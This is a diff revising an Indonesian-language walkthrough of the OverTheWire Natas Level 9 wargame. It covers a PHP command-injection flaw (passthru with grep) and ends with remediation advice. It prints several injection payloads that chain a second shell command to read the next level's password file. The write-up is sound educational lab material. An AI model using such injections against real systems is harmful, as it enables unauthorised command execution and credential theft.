@@ -7,11 +7,11 @@ sidebarTitle: "Level 9 — Injeksi Perintah"
 ## Profil
 
 - **Target:** `http://natas9.natas.labs.overthewire.org`
-- **Kredensial:** `natas9` / (password dari Level 8)
+- **Kredensial:** `natas9` / (*password* dari Level 8)
 
 ## Pengintaian
 
-Halaman menyediakan fitur pencarian. Kode sumber PHP mengungkapkan implementasi:
+Laman menyediakan fitur pencarian yang tampak mencari melalui suatu kamus data. Kode sumber PHP mengungkapkan implementasi di balik layar:
 
 ```php
 $key = $_REQUEST["needle"];
@@ -21,31 +21,38 @@ if($key != "") {
 }
 ```
 
+Masukan pengguna disisipkan secara langsung ke dalam string perintah *shell* tanpa sanitasi apa pun.
+
 ## Analisis
 
-Fungsi `passthru()` PHP mengeksekusi perintah melalui shell. Karena input pengguna digabungkan langsung ke string perintah, metakarakter shell akan diinterpretasikan oleh shell. Ini adalah **command injection** (CWE-78).
+Fungsi `passthru()` pada PHP mengeksekusi suatu perintah melalui *shell* dan meneruskan keluaran mentahnya. Dikarenakan masukan pengguna digabungkan langsung ke dalam string perintah alih-alih diteruskan sebagai argumen, metakarakter *shell* akan diinterpretasikan oleh *shell*.
+
+Ini merupakan kerentanan **injeksi perintah** (*command injection*) klasik (CWE-78). Perintah `grep` mencari pola masukan di dalam `dictionary.txt`, namun operator *shell* dapat digunakan untuk mengeksekusi perintah sembarang.
 
 ## Eksploitasi
 
-Operator shell `;` memungkinkan pembuatan rantai perintah. Injeksi:
+Operator *shell* `;` memungkinkan pembuatan rangkaian perintah. Injeksi:
 
 ```
 ; cat /etc/natas_webpass/natas10
 ```
 
-Menyebabkan shell mengeksekusi:
+Mengakibatkan *shell* mengeksekusi:
 
 ```bash
 grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
 ```
 
-Payload alternatif:
+Perintah pertama `grep -i` tanpa pola (menunggu *stdin* tanpa keluaran berarti), kemudian mengeksekusi `cat /etc/natas_webpass/natas10` yang mencetak *password* untuk Level 10.
 
-- Pipe: `| cat /etc/natas_webpass/natas10`
-- Backticks: `` `cat /etc/natas_webpass/natas10` ``
+Muatan alternatif menggunakan operator *shell* lain:
+
+- *Pipe:* `| cat /etc/natas_webpass/natas10`
+- *Baris baru:* `\n cat /etc/natas_webpass/natas10`
+- *Backticks:* `` `cat /etc/natas_webpass/natas10` ``
 
 ## Remediasi
 
-- Jangan pernah memberikan input pengguna langsung ke fungsi eksekusi shell
-- Gunakan `escapeshellarg()` jika eksekusi shell diperlukan
-- Pilih API native bahasa pemrograman daripada perintah shell
+- Jangan pernah memberikan masukan pengguna secara langsung ke fungsi eksekusi *shell*
+- Gunakan `escapeshellarg()` atau `escapeshellcmd()` apabila eksekusi *shell* tidak terhindarkan
+- Utamakan API *native* bahasa pemrograman dibandingkan perintah *shell* (misalnya `fopen()` PHP daripada `cat`)
